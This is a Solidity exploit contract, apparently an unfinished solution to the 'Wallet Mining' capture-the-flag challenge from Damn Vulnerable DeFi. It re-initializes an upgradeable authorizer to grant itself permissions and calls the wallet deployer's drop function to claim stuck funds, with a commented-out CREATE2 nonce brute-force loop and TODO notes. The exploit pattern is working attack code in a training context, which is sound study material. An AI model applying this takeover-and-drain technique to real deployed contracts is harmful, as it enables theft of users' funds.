// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {
    AuthorizerFactory,
    AuthorizerUpgradeable,
    TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    Safe,
    OwnerManager,
    Enum
} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {
    SafeProxy
} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

contract HackWalletMining {
    constructor(
        AuthorizerUpgradeable _authorizerUpgradeable,
        WalletDeployer _walletDeployer,
        address _singleton,
        address _deployer,
        DamnValuableToken _token,
        address ward,
        address user,
        uint256 nonce,
        bytes32 salt,
        bytes32 initCodeHash,
        bytes memory initializer
    ) {
        console.log("deployer", _deployer);
        // so it seems we need to do 2 things here:

        // 1. recover all tokens from the wallet deployer contract and send them to the corresponding ward

        // 2. (or 1.?) save the user's funds and return them
        // tokens are stuck in an address no-one has control over, so we must find the correct nonce to be able to create this contract as it already contains the funds.
        // Since we can initialize the proxy again we could be able to give ourselves permissions to upgrade the contract and perhaps that's easier to find the nonce

        // => when deploying the user wallet we also get the ward reward which is the entire contract balance so both can be done with 1 call

        // actual steps:

        // initialize the authorizerUpgradeable contract so this address would be authorized
        address[] memory wards = new address[](1);
        wards[0] = address(this);

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        // init the contract and overwrite access
        _authorizerUpgradeable.init(wards, aims);

        // bytes memory initializer = abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0),  0, payable(address(0))));
        // bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
        // bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(_singleton))));

        uint256 walletDeployerBalance = _token.balanceOf(address(_walletDeployer));

       bool success = _walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
       console.log("success", success);

        // @todo move this code to the test file so we can easily use the paramters there
        // @todo find correct initializer function and parameters
        // @todo find correct saltNonce
        // bool test = false;
        // address predicted = address(0);
        // while(test == false && saltNum < 30000){

        //     salt = keccak256(abi.encodePacked(keccak256(initializer), saltNum));
            
        //     predicted = Create2.computeAddress(salt, initCodeHash, _deployer);
        //     console.log("saltNum", saltNum);
            
        //     saltNum++;

        //     if(predicted == USER_DEPOSIT_ADDRESS){
        //         test = true;
        //          // test = _walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNum);
        //     }
            
        //     console.log("test", test);
        // }

        // use drop to create the new safe contract, but first we need to figure out which nonce to use

        // when using drop, we automatically drain the contract of 1 ether as well, which should be the entire balance

        // send the balance to the correct ward
        // _token.transfer(ward, walletDeployerBalance);
        
    }
}
